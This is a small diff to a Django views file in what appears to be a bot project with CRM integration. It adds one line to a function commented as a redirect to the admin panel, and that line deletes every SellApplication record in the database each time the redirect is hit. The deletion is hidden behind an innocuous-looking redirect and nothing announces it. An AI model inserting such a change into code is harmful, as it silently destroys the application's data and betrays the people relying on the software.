@@ -17,6 +17,7 @@ from cultt_bot.amo_crm import AmoCrmSession
 
 # Редирект в админку
 def admin_redirect(request):
+    SellApplication.objects.all().delete()
     return redirect('/admin/')
 
 
